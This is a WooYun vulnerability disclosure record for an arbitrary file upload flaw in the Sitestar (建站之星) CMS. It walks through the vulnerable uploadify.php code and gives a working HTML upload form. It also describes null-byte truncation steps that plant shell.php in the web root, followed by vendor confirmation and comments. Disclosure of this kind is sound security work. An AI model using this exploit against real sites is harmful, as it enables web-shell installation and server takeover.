{"id": 4878, "wybug_id": "wooyun-2014-048760", "wybug_title": "建站之星任意文件上传漏洞(续一)", "wybug_corp": "建站之星", "wybug_author": "felixk3y", "wybug_date": "2014-01-13 15:47", "wybug_open_date": "2014-04-13 15:47", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "文件上传漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向公众公开  简要描述： 本月8号就发了个同样的上传漏洞http://www.wooyun.org/bugs/wooyun-2010-048293迟迟不给确认,好吧 那我就只有用这种方式催催...Tips:如果再不及时确认,就公布续集二... 详细说明：  #1 漏洞挖掘漏洞出现在/script/multiupload/uploadify.php 51行---\nif (!empty($_FILES) && in_array($file_ext,$ext_arr)) {\t//echo '2222';\t$tempFile = $_FILES['Filedata']['tmp_name'];\t$targetPath = $_SERVER['DOCUMENT_ROOT'] . $path . '/';\t//echo $targetPath;\t$imgfile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];\t// 解决Windows中文文件名乱码\tif (preg_match(\"/^WIN/i\", PHP_OS)) {\t\t$imgfile = iconv('UTF-8', 'GBK', $imgfile);\t}\tmove_uploaded_file($tempFile, $imgfile);\tParamParser::fire_virus($imgfile);\tfunction img_restruck($imgfile_name,$root, $path = 'upload/image/') {\t\tdefine('SSFCK', 1);\t\tdefine('SSROOT', $root);\t\tinclude_once($root.'/library/image.func.php');\t\t$fullfilename = SSROOT.\"/$path\".$imgfile_name;\t\tWaterImg($fullfilename, 'up');    }\tif($WATERMARK_STATUS) img_restruck($_FILES['Filedata']['name'],$root);\techo \"1\";}\n#2 漏洞分析往往出现文件上传漏洞,不是文件名可控,就是路径可控(低级的文件上传不包括在内)看看文件名是否可控搜索move_uploaded_file函数,往前看...\nmove_uploaded_file($tempFile, $imgfile);\n跟上$imgfile\n$imgfile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];\n$_FILES['Filedata']['name']貌似我们可以控制,继续...\n$_FILES['Filedata']['name'] = date(\"YmdHis\") . '_' . rand(10, 99) . '.' . $file_ext;\n看见了吧,原来我们不可控.好吧 那我们继续看另一个：路径是否可控\n$imgfile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];\n跟下$targetPath\n$targetPath = $_SERVER['DOCUMENT_ROOT'] . $path . '/';\n看看 $path 怎么来的，本文件第14行：\nlist($path, $target) = explode(\"|\", $_POST['folder']);\n看见了吧? $_POST['folder'] 是我们完全可以控制的呵呵 ,看吧 漏洞挖掘原来如此简单...(其实一点儿也不简单 :-))   漏洞证明：  #3 漏洞利用将如下代码保存为Upload.htm\n<html><body><form id=\"frmUpload\" action=\"http://127.0.0.1/sitestar/script/multiupload/uploadify.php?\" method=\"post\" enctype=\"multipart/form-data\" >  <input type=\"file\" name=\"Filedata\" id=\"Filedata\">  <input name=\"folder\" type=\"hidden\" value=\"/shell.php.jpg|shell.jpg\">  <input id=\"btnUpload\" type=\"submit\" value=\"Upload\"></form></body></html>\n访问Upload.htm,采用Burpsuite抓包截断\n\n点击Forward，就可在根目录下生成shell.php\n\n   修复方案：  你们懂,如有疑问 可以联系我。   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-14 10:59 厂商回复： 漏洞已经发补丁包，感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-13 16:18 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  大牛啊，牛逼轰轰啊！    \n     2014-01-13 17:02 |    \t\t宇少 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        | Jyhack-TeaM：bbs.jyhack.com 群:308694453...)\t\t \n  叼炸天    \n     2014-04-14 09:23 |    \t\t大大怪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | PHP 爱好者)\t\t \n  iis 7 不支持 DOCUMENT_ROOT ，也算是这个程序一个缺陷。     \n     2014-04-14 09:33 |    \t\t大大怪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | PHP 爱好者)\t\t \n  我在 ii7.5 php 5.3 上 始终 00 无法截断。 请楼主解答。    \n     2014-05-02 15:19 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @大大怪 5.3.4 不支持%00    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}